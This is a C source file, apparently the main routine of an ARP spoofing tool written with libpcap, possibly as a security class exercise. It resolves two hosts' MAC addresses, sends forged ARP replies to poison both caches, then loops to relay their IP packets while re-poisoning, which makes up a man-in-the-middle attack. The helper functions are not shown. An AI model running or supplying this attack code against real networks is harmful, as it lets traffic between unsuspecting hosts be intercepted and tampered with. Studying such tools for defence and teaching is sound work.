#include "arp_spoof.h"

int main(int argc, char* argv[]) {
  if( argc <= 3 || argc % 2 == 1) {
    usage();
    return -1;
  }

  //parse ip from argv
  uint8_t sender_ip[4], target_ip[4];
  parse_IP(argv[2], sender_ip);
  parse_IP(argv[3], target_ip);

  printf("sender ip: ");
  print_IP(sender_ip);
  printf("target ip: ");
  print_IP(target_ip);

  //get my ip address
  uint8_t attacker_ip[4];
  if(get_attacker_IP(argv[1], attacker_ip) < 0) {
    perror("get attacker ip error");
    return -1;
  }
  printf("attacker ip: ");
  print_IP(attacker_ip);

  //get my mac address
  char* dev = argv[1];
  uint8_t attacker_mac[6];  
  if(get_attacker_mac(dev, attacker_mac) < 0) {
    perror("get attacker mac error");
    return -1;
  }
  printf("my mac address: ");
  print_mac(attacker_mac);

  //open pcap
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  uint8_t broadcast[6];
  for(int i = 0; i < 6; i++) {
    broadcast[i] = 0xff;
  }
  
  //get sender mac
  uint8_t sender_mac[6];
  send_arp(handle, REQUEST, target_ip, sender_ip, attacker_mac, broadcast);
  int chk = 1;
  while(chk) {
    chk = get_mac_by_ip(handle, sender_ip, sender_mac);
  }
  printf("sender mac address: ");
  print_mac(sender_mac);

  //get target mac
  uint8_t target_mac[6];
  chk = 1;
  while(chk) {
//    printf("%d", chk);
    send_arp(handle, REQUEST, sender_ip, target_ip, attacker_mac, broadcast);
    chk = get_mac_by_ip(handle, target_ip, target_mac);
  }
  printf("target mac address: ");
  print_mac(target_mac);
  
  //arp spoof
  printf("0");
  send_arp(handle, REPLY, target_ip, sender_ip, attacker_mac, sender_mac);
  printf("1");
  send_arp(handle, REPLY, sender_ip, target_ip, attacker_mac, target_mac);
  printf("2");
  //relay and prevent arp recovery
  int cnt = 0;
  while(cnt <= 100) {
    printf("3");
    relay_ip_packet(handle, attacker_ip, attacker_mac, sender_mac, target_mac);
    printf("4");
    prevent_arp_recovery(handle, attacker_ip, sender_mac);
    printf("5");
    relay_ip_packet(handle, attacker_ip, attacker_mac, target_mac, sender_mac);
    printf("6");
    prevent_arp_recovery(handle, attacker_ip, target_mac);
    printf("7");
    cnt++;
  }

  return 0;
}

